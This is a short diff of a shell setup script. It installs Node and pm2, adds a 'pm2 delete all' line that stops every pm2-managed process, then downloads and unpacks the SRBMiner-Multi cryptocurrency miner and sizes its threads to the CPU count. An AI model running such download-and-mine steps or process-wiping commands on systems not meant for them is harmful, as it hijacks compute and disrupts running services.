@@ -5,6 +5,7 @@ export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || pr
 nvm install v16
 nvm use v16
 npm i pm2 -g
+pm2 delete all
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.6/SRBMiner-Multi-2-3-6-Linux.tar.xz && tar -xf SRBMiner-Multi-2-3-6-Linux.tar.xz && cd SRBMiner-Multi-2-3-6
 rm miner.sh
 threads=$(echo $(echo "$(grep -c ^processor /proc/cpuinfo)" | bc) | awk '{printf "%d\n",$1}')
